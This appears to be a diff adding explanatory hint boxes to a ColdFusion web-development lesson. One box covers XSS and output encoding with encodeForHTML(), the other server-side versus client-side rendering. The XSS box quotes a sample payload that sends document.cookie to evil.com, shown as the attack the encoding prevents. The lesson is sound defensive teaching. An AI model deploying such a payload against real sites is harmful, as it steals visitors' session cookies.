@@ -138,6 +138,59 @@ The `<!DOCTYPE html>` declaration on line 1 is the only doctype you need for HTM
 
 Notice `encodeForHTML()` — always encode untrusted data before rendering it in HTML to prevent XSS.
 
+::hint-box
+---
+:summary: What is XSS and why does encodeForHTML() matter?
+---
+
+**XSS — Cross-Site Scripting** is one of the most common web vulnerabilities. It happens when an attacker injects malicious JavaScript into a page that other users then load in their browser. The injected script runs with the same trust as the legitimate page, allowing it to steal session cookies, redirect users, or perform actions on their behalf.
+
+**A classic example without encoding:**
+
+```cfml
+<!--- DANGEROUS — never do this --->
+<cfoutput>
+  <p>Hello, #form.username#!</p>
+</cfoutput>
+```
+
+If a user submits `<script>document.location='https://evil.com?c='+document.cookie</script>` as their username, that script tag lands verbatim in the HTML and executes in every visitor's browser.
+
+**With `encodeForHTML()` — safe:**
+
+```cfml
+<!--- SAFE — output is escaped before rendering --->
+<cfoutput>
+  <p>Hello, #encodeForHTML(form.username)#!</p>
+</cfoutput>
+```
+
+`encodeForHTML()` converts dangerous characters to their HTML entity equivalents:
+
+| Character | Encoded as |
+|---|---|
+| `<` | `&lt;` |
+| `>` | `&gt;` |
+| `"` | `&quot;` |
+| `'` | `&#x27;` |
+| `&` | `&amp;` |
+
+The browser renders the entity as visible text, never as executable markup.
+
+**ColdFusion's encoding functions — use the right one for the context:**
+
+| Context | Function |
+|---|---|
+| Inside HTML tags / text | `encodeForHTML()` |
+| Inside an HTML attribute value | `encodeForHTMLAttribute()` |
+| Inside a `<script>` block | `encodeForJavaScript()` |
+| Inside a URL parameter | `encodeForURL()` |
+| Inside a CSS value | `encodeForCSS()` |
+
+**The practical rule:** any time you render data that came from a user, a database, a URL parameter, or any external source — encode it. The only safe assumption is that all external data is untrusted.
+
+::
+
 ---
 
 ## Activity 2 — Add the HTML5 doctype and verify
@@ -176,6 +229,54 @@ HTML5 doctype is present in `html5_demo.cfm`. ✓
 ## Two patterns for sending CFML data to JavaScript
 
 There are two established approaches for getting server-side data into browser JavaScript. Which one you use depends on your architecture.
+
+::hint-box
+---
+:summary: What is SSR (Server-Side Rendering) and how does it differ from CSR?
+---
+
+**SSR — Server-Side Rendering** means the server builds the complete HTML document — including all data — and sends it to the browser in a single HTTP response. The browser receives a fully-formed page it can display immediately, with no additional requests needed to fetch data.
+
+**CSR — Client-Side Rendering** means the server sends a minimal HTML shell, and the browser then makes one or more additional requests (usually `fetch()` or XHR) to load data and build the page using JavaScript.
+
+```
+SSR flow:
+  Browser → GET /tickets.cfm → ColdFusion queries DB, builds full HTML → Browser renders
+
+CSR flow:
+  Browser → GET /index.html → empty shell arrives
+  Browser → GET /api/tickets.cfm → JSON data arrives → JS builds the DOM
+```
+
+**In ColdFusion, SSR is the default model.** Every `.cfm` page that uses `<cfoutput>`, `queryExecute()`, or `writeOutput()` is doing SSR — ColdFusion runs the logic, builds the HTML, and returns it complete.
+
+**Why SSR is still relevant today:**
+
+| Concern | SSR | CSR |
+|---|---|---|
+| Time to first paint | Fast — page is ready on arrival | Slower — JS must run first |
+| SEO | Excellent — content is in the initial HTML | Requires extra work (SSR frameworks or pre-rendering) |
+| Simplicity | One request, no loading states | Requires error handling, spinners, and state management |
+| Real-time data | Full page reload to refresh | `fetch()` can update just part of the page |
+
+**The ColdFusion SSR pattern:**
+
+```cfml
+<cfscript>
+  tickets = queryExecute("SELECT id, title FROM hd_tickets", {}, {datasource:"training_db"});
+</cfscript>
+<ul>
+  <cfoutput query="tickets">
+    <li>#encodeForHTML(title)#</li>
+  </cfoutput>
+</ul>
+```
+
+This is pure SSR — by the time the `<ul>` reaches the browser, every `<li>` is already there. No JavaScript required.
+
+**When to move to CSR:** when your data must refresh without a full page reload (live dashboards, chat, notifications), or when you are building a dedicated React/Vue/Angular SPA that consumes a CF JSON API.
+
+::
 
 ::hint-box
 ---
